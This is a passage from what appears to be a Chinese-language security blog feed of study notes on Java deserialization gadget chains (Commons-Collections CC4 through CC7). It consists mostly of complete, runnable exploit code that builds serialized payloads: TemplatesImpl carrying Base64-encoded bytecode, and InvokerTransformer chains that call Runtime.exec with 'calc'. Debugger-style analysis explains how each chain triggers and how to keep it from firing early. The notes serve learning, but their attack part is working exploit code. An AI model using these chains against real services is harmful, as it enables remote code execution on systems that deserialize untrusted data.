            byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");

            //反射设置 Field
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

            //Transformer数组
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };


            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            //TransformingComparator 实例
            TransformingComparator comparator = new TransformingComparator(chainedTransformer);

            //PriorityQueue 实例
            PriorityQueue priorityQueue = new PriorityQueue(2);
            //先设置为正常变量值，后面可以通过setFieldValue修改
            priorityQueue.add(1);
            priorityQueue.add(1);

            //反射设置 Field
            Object[] objects = new Object[]{templates, templates};
            setFieldValue(priorityQueue, "queue", objects);
            setFieldValue(priorityQueue, "comparator", comparator);

            //序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(priorityQueue);
            oos.flush();
            oos.close();

            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    //反射设置 Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

```
## 相比其他CC链
在CommonsCollections4系列中，除4.0版本，其他版本InvokerTransformer类都没有实现Serializable接口 ，导致无法序列化，所以这里就是在CC2的基础上使用InstantiateTransformer替换了InvokerTransformer

## 分析
代码与CC1、CC2、CC3有重合，这里就不画蛇添足了

## 完整代码
```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections4 {

    //用于反射调用成员变量并赋值
    public static void setValue(Object object, String fieldName, Object fieldValue) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object,fieldValue);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name","test111");
        setValue(templates,"_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //TransformingComparator实例，并将InvokerTransformer封装进去
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        //获取PriorityQueue实例
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(2);

        //PriorityQueue实例的成员变量赋值
        Object[] objects = new Object[]{templates,templates};
        setValue(priorityQueue,"queue",objects);
        setValue(priorityQueue,"comparator",transformingComparator);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa23.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(priorityQueue);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa23.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
效果:

![](https://s3.hedgedoc.org/demo/uploads/8072c067-f5b1-4039-8cab-ca24c5e287e2.png)

报错，但是不影响我弹计算器

## 学习
https://xz.aliyun.com/t/9409




























]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>6、CC5</title>
    <url>/2023/08/25/6%E3%80%81CC5/</url>
    <content><![CDATA[# CC5
## 利用版本
jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
## 相比其他CC链
其实和CC1-2调用链相似，只不过CC1-2序列化的类是InvocationHandler（AnnotationInvocationHandler），CC5序列化的类是BadAttributeValueExpException，其他的代码都差不多
## CC5 Demo
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //BadAttributeValueExpException 实例
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //反射设置 val
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();

    }

}

```
## 分析
直接从中间开始分析

![](https://s3.hedgedoc.org/demo/uploads/91ce6c1d-6b8c-408c-9305-730cb05602bc.png)

还是用的LazyMap，那么肯定是通过LazyMap.get()方法触发；接着将LazyMap对象给封装到TiedMapEntry对象中，我们跟进到TiedMapEntry的这个构造方法

![](https://s3.hedgedoc.org/demo/uploads/bc4bf361-f296-4fdf-8e9a-9113a01f082c.png)

构造方法有两个形参，一个是Map对象，一个是Object对象，这个构造方法主要是给成员变量赋值，其中第一个形参Map是LazyMap对象，所以这里的成员变量map就是LazyMap对象

![](https://s3.hedgedoc.org/demo/uploads/67b94a76-56af-4e2f-8876-fecb38da196f.png)

而TiedMapEntry类中的getValue()方法调用了map（LazyMap）的get()方法

![](https://s3.hedgedoc.org/demo/uploads/a508c377-92e6-4d41-9412-0a8795ed25c0.png)

且equals()、hashCode、toString()方法调用了getValue()方法，也就是说这三个方法都会触发LazyMap.get()方法造成命令执行

继续看demo

![](https://s3.hedgedoc.org/demo/uploads/466acd03-3985-41bc-a675-b40e867e33ba.png)

TiedMapEntry对象被封装到了BadAttributeValueExpException对象中，并赋值给BadAttributeValueExpException对象中的成员变量var，最后将BadAttributeValueExpException对象序列化

那么说明，触发点在BadAttributeValueExpException对象中的readObject()方法中，我们跟进BadAttributeValueExpException.readObject()方法

![](https://s3.hedgedoc.org/demo/uploads/3d99d71d-4710-4d72-87bc-94b61feb1b4a.png)

上图中，先从序列化BadAttributeValueExpException对象中获取到成员变量var的值，然后赋值给valObj，接下来再调用valObj的toString()方法，但是要进入valObj.toString()这个代码，valObj不能为空且varObj不能是String类的实例对象

![](https://s3.hedgedoc.org/demo/uploads/8224f9b1-e3c7-466d-8369-1eb50e4fd74d.png)

不过demo中，直接将TiedMapEntry对象赋值给了成员变量var，所以反序列化BadAttributeValueExpException对象时候，valObj是一个TiedMapEntry对象（valObj不能为空且varObj不能是String类的实例对象），那么就会调用TiedMapEntry.toString()方法，同时也会调用了LazyMap.get()方法，弹出计算器
## 完整代码
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //BadAttributeValueExpException 实例
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //反射设置 val
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(badAttributeValueExpException);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
## 学习
https://xz.aliyun.com/t/9409



































]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>7、CC6</title>
    <url>/2023/08/25/7%E3%80%81CC6/</url>
    <content><![CDATA[# CC6
## 利用版本
jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
## CC6 Demo
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        Transformer[] fakeTransformer = new Transformer[]{};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        //先设置假的 Transformer 数组，防止生成时执行命令
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "test");


        //通过反射设置真的 ransformer 数组
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        //清空由于 hashMap.put 对 LazyMap 造成的影响
        lazyMap.clear();

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();

    }

}

```
## 分析
看demo，其实和CC5差不多，不同就是序列化的对象不一样

![](https://s3.hedgedoc.org/demo/uploads/d462d5f7-2153-483f-9c2e-873718b880f7.png)

![](https://s3.hedgedoc.org/demo/uploads/c8ebde39-5ac3-40ca-88b2-387d840fffd9.png)

相同的是都将LazyMap封装到了TiedMapEntry对象

![](https://s3.hedgedoc.org/demo/uploads/3965a520-65ce-4835-bb05-6e4792d43442.png)

![](https://s3.hedgedoc.org/demo/uploads/9cc60eab-f4e4-4f08-9fd5-d46391e6856e.png)

在CC5的分析文章中分析说到，要触发LazyMap.get()方法，TiedMapEntry有三个方法都可以触发

![](https://s3.hedgedoc.org/demo/uploads/3d3172ad-3436-44c4-b840-f3331874ec00.png)

![](https://s3.hedgedoc.org/demo/uploads/67c3fe03-3508-49b5-a26b-c19ecd852b1f.png)

其中hashCode()方法法跟序列化的HashMap对象有关系，我们跟进HashMap.readObject()方法

![](https://s3.hedgedoc.org/demo/uploads/e55e47da-bd73-46ec-a130-cc3f32855696.png)

跟进hash()

可以看到，在hash()方法中，会调用key.hashCode()

回到demo中，可以看到HashMap对象传入的key是一个TiedMapEntry对象，所以反序列化HashMap对象的时候，就会调用TiedMapEntry.hashCode()方法，进而触发LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/6dd3ef18-b04c-49cd-8169-2b0f576d0415.png)

只要调用了LazyMap.get()，就可以触发ChainedTransformer.transform()，进而对transformers数组进行回调，最后执行命令

但是，调用HashMap.put()方法的时候，也会调用hashCode()方法，这样的话还序列化就直接执行命令了

![](https://s3.hedgedoc.org/demo/uploads/8897cdd0-be24-4838-8799-ca9e2826769a.png)

![](https://s3.hedgedoc.org/demo/uploads/86cee55e-8e8a-4a94-9a43-1ffb0679149c.png)

这样不符合预期，我们需要在反序列化的时候才能触发命令执行，所以代码需要修改一下

如下图所示，另外写一个Transformer数组对象fackTransformers，并且封装到ChainedTransformer对象中，这样在调用HashMap.put()方法的时候就不会触发我们的命令执行了

![](https://s3.hedgedoc.org/demo/uploads/426c5e82-828d-472d-bb49-bc27461804ef.png)

然后在调用完HashMap.put()方法后，我们需要将能执行命令的Transformer数组对象给封装到ChainedTransformer对象中，这里可以用反射进行更改

![](https://s3.hedgedoc.org/demo/uploads/e609661e-d707-4bee-b587-6e188e11ffb4.png)

但是，还有一个需要改的地方，我们跟进LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/c1deb684-e249-47e2-8a11-7bdcb3383f7e.png)

在调用HashMap.put的时候，成员变量map会被赋值，这里打个断点调试一下

![](https://s3.hedgedoc.org/demo/uploads/ff6459e0-70ce-4042-ac58-a39dedb4564b.png)

如上图所示，因为map在调用HashMap.put的时候并没有赋值，所以进入第58行if的时候，值为false，顺利进入158行的代码逻辑，调用map.put()方法，给map赋值，key和value都是“test”

继续调试，在进入反序列化的时候再次回到了LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/3a8a3672-3b46-4e1b-a19b-6738292bafbd.png)

调试结果如上图所示，此时传入的key是“test”，而map的key也是“test”（第一次进入LazyMap.get()时候赋值），所以在156行的if语句中，map.containsKey(key)的结果是true，所以就直接进入63行的代码，而没有进入if里面触发157行factory.transform()方法

要想进入if里面，就得将map的key给去掉，我们跟进map

![](https://s3.hedgedoc.org/demo/uploads/88f51288-e638-4f7d-92f5-50ecd97d00c2.png)

![](https://s3.hedgedoc.org/demo/uploads/3d860024-6198-4353-ae28-56e516b198e6.png)

可以发现，map来自LazyMap的父类AbstractMapDecorator成员变量map，是个Map对象

所以可以通过Map.clear()或者Map.remove("test");

![](https://s3.hedgedoc.org/demo/uploads/7ca9a1b5-121b-48c0-9f33-3183d2ab5ef3.png)

运行

![](https://s3.hedgedoc.org/demo/uploads/e1179cd2-1e83-4a1d-af58-344728a6ff75.png)

![](https://s3.hedgedoc.org/demo/uploads/eecb6df9-42ca-41b2-9a3f-5c39a1df64c3.png)

成功弹出计算器
## 完整代码
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {

        //Transformer数组对象
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //弄一个不能执行命令的Transformer数组对象，这样在HashMap.put()的时候就不会执行命令
        Transformer[] fackTransformers =  new Transformer[]{};

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(fackTransformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //new一个HashMap对象
        Map map = new HashMap();
        map.put(tiedMapEntry, "aaa");

        //获取LazyMap父类中的map成员变量
        Field field1 = lazyMap.getClass().getSuperclass().getDeclaredField("map");
        field1.setAccessible(true);
        Map map1 = (Map) field1.get(lazyMap);
        //将map的键对清空，即可进入if后面的代码逻辑
        //map1.clear();
        map1.remove("test");

        //获取ChainedTransformer对象中的成员变量iTransformers
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        //将能执行命令的Transformer数组对象给赋值给成员变量iTransformers
        field.set(chainedTransformer, transformers);


        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(map);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
## 学习
https://xz.aliyun.com/t/9409
























]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>8、CC7</title>
    <url>/2023/08/25/8%E3%80%81CC7/</url>
    <content><![CDATA[# CC7
## 利用版本
jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
## CC7 Demo
```java=
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7 {

    public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException {

        Transformer[] fakeTransformer = new Transformer[]{};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        //先设置假的 Transformer 数组，防止生成时执行命令
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);

        //LazyMap实例
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, "test");
        hashtable.put(lazyMap2, "test");


        //通过反射设置真的 transformer 数组
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);

        //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=>yy，所以这里要移除
        lazyMap2.remove("yy");

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashtable);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

}

```

## 分析
CC7和CC5、CC6差不多，，调用命令的部分和CC6一模一样

![](https://s3.hedgedoc.org/demo/uploads/29b5b390-3b1b-4b2a-a266-7f6437214fd4.png)

不同LayzMap对象封装到Hashtable对象中，序列化的对象是Hashtable对象

